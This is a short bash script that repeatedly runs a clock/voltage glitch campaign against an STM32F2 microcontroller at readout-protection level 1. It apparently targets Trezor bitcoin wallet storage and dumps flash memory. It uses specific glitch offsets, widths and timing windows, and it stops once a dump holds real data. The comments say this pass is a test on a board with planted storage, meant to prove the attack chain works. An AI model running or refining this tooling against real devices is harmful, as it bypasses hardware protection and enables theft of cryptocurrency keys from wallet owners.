#!/bin/bash
# Decisive planted-board test: STM32F2 @ RDP1, storage.bin planted (NRC2).
# us 180-186 (flip-productive zone), rep6-7, scope OFF. Every flip reads
# storage_0000 (the NRC2 chunk). Stops the instant a flip banks REAL data.
set -u
cd /home/tdaly/trezor-btc/storage-sim
LOG=/tmp/opencode/planted_loop.log
P=0
while true; do
  P=$((P+1))
  echo "=== PLANTED-TEST PASS $P  $(date '+%H:%M:%S') ===" | tee -a "$LOG"
  G_CLKGEN=166666667 G_OFFSET=-45 G_WIDTH=5 G_US_MIN=180 G_US_MAX=186 \
  G_RND_REP=1 G_RND_LO=33 G_RND_HI=45 G_SAMPLES=3 G_COOLDOWN=0.15 \
  G_RESET_EVERY=1 G_SHOTS=50000 G_TAG=plantedp${P} \
  /home/tdaly/.cwvenv/bin/python -u rdp1_glitch_campaign_full_mem_dump.py 2>&1 | tee -a "$LOG"
  if ls dumps/run_*/*.bin 2>/dev/null | grep -qv '\.bad\.bin$'; then
    echo "=== *** REAL DATA BANKED on pass $P -> CHAIN PROVEN, STOPPING ***" | tee -a "$LOG"; break
  fi
  echo "=== pass $P done, no real bank (ghosts: $(ls dumps/run_*/*.bad.bin 2>/dev/null|wc -l)). next. ===" | tee -a "$LOG"
  sleep 3
done
